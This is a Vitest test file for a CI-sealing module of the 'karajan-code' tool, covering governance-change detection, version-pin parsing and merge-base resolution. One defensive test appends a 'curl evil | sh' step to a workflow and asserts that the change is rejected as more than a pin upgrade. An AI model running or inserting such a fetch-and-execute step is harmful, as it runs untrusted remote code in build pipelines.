// KJC-TSK-1654 (ADR 0060): at critical the seal asks the phone only when it changes who governs.
import { describe, expect, it } from "vitest";
import { basePinOf, pinOnlyUpgrade, sealBase, sealGoverns } from "../../src/harden/critical-seal.js";

const hook = { file: ".karajan/hooks/pre-commit", sha256: "a1" };
const policy = { file: ".karajan/policy.yml", sha256: "p1" };
const isGovernance = (file) => file === ".karajan/policy.yml";
const workflow = (pin) => `- run: npm install --no-save karajan-code@${pin}\n`;
const runWith = (pin, source = null) => (args) => {
  const spec = String(args[1] ?? "");
  if (source && spec.endsWith(":bin/kj.js")) return "#!/usr/bin/env node\n";
  if (source && spec.endsWith(":package.json")) return JSON.stringify({ name: "karajan-code", version: source });
  if (pin === null || !spec.endsWith(":.github/workflows/kj-verdicts.yml")) throw new Error("no such path");
  return workflow(pin);
};

describe("sealGoverns", () => {
  it("is null for a seal of what kj generates, judged by a CI that reads unsigned seals", () => {
    const previous = { files: [{ ...hook, sha256: "a0" }, policy] };
    expect(sealGoverns({ hashed: [hook, policy], previous, isGovernance, run: runWith("5.27.0") })).toBeNull();
    expect(sealGoverns({ hashed: [hook, policy], previous, isGovernance, run: runWith(null) })).toBeNull();
  });
  it("names the governance config it changes, a deletion, or a base CI too old to read it", () => {
    const previous = { files: [hook, { ...policy, sha256: "p0" }] };
    expect(sealGoverns({ hashed: [hook, policy], previous, isGovernance, run: runWith("5.27.0") })).toMatch(/governance config \(\.karajan\/policy\.yml\)/);
    expect(sealGoverns({ hashed: [{ file: hook.file, deleted: true }], previous: null, isGovernance, run: runWith("5.27.0") })).toMatch(/deletion/);
    expect(sealGoverns({ hashed: [hook], previous: { files: [hook] }, isGovernance, run: runWith("5.26.1") })).toMatch(/kj 5\.26\.1, which reads no unsigned seal/);
  });
  it("a workflow that only moves its kj pin up governs nothing new; any other change to it does", () => {
    const file = ".github/workflows/kj-verdicts.yml";
    const wf = { file, sha256: "w1" };
    const previous = { files: [{ ...wf, sha256: "w0" }] };
    const isWorkflow = (f) => f === file;
    const opts = { hashed: [wf], previous, isGovernance: isWorkflow, run: runWith("5.27.0") };
    expect(sealGoverns({ ...opts, readNow: () => workflow("5.28.0") })).toBeNull();
    expect(sealGoverns({ ...opts, readNow: () => `${workflow("5.28.0")}- run: x\n` })).toMatch(/governance config/);
  });
});

describe("basePinOf", () => {
  it("reads the kj the base branch's verdicts workflow installs, under either package name", () => {
    expect(basePinOf(runWith("5.30.2"))).toEqual([5, 30, 2]);
    const scoped = (args) => {
      if (String(args[1]).endsWith(":.github/workflows/kj-verdicts.yml")) return "npm install @karajan-family/code@6.0.0";
      throw new Error("no such path");
    };
    expect(basePinOf(scoped)).toEqual([6, 0, 0]);
    expect(basePinOf(runWith(null))).toBeNull();
  });
  it("judges with the base's own kj when the base is kj's source, as the workflow does", () => {
    expect(basePinOf(runWith("5.26.1", "5.27.3"))).toEqual([5, 27, 3]);
  });
});

describe("sealBase", () => {
  it("is the merge base of a three-dot range, the left of a two-dot one, HEAD when staged", async () => {
    const run = async (args) => (args[0] === "merge-base" ? `mb-${args[1]}-${args[2]}\n` : "");
    expect(await sealBase(run, "main...HEAD")).toBe("mb-main-HEAD");
    expect(await sealBase(run, "main..HEAD")).toBe("main");
    expect(await sealBase(run, null)).toBe("HEAD");
    expect(await sealBase(async () => { throw new Error("no git"); }, "a...b")).toBeNull();
  });
});

// ADR 0060, step 2c: what a release re-seal brings to a workflow.
describe("pinOnlyUpgrade", () => {
  const wf = (a, b = a) => `steps:\n  - run: npm install karajan-code@${a}\n  - run: npx @karajan-family/code@${b} policy check\n`;
  it("is true when the only change is the kj pinned, moved up", () => {
    expect(pinOnlyUpgrade(wf("5.26.1"), wf("5.27.0"))).toBe(true);
    expect(pinOnlyUpgrade(wf("5.26.1", "5.26.1"), wf("5.27.0", "5.26.1"))).toBe(true);
  });
  it("is false for any other change, an older kj, a pin added or taken away, or no change", () => {
    expect(pinOnlyUpgrade(wf("5.26.1"), `${wf("5.27.0")}  - run: curl evil | sh\n`)).toBe(false);
    expect(pinOnlyUpgrade(wf("5.27.0"), wf("5.26.1"))).toBe(false);
    expect(pinOnlyUpgrade("steps: []\n", wf("5.27.0"))).toBe(false);
    expect(pinOnlyUpgrade(wf("5.27.0"), wf("5.27.0"))).toBe(false);
    expect(pinOnlyUpgrade(null, wf("5.27.0"))).toBe(false);
    // Another package under the same version is no version moved up.
    expect(pinOnlyUpgrade("run: npx karajan-code@5.27.0\n", "run: npx @karajan-family/code@5.27.0\n")).toBe(false);
    expect(pinOnlyUpgrade("run: npx karajan-code@5.26.0\n", "run: npx @karajan-family/code@5.27.0\n")).toBe(false);
  });
});
